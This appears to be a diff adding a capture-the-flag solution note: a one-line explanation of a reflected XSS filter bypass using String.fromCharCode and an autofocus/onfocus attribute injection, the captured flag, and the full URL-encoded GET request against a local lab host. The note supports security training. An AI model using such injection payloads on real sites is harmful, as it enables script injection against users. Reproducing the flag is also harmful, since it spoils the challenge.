@@ -1,0 +1,4 @@
+# Reflected XSS bypassing 'XSS' filter using String.fromCharCode(88,83,83). autofocus+onfocus fires in headless browser. x=" tail fixes orphaned quote. FLAG: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}
+
+GET /page?name=%22+autofocus+onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29+x%3D%22 HTTP/1.1
+Host: 172.17.0.1:45817
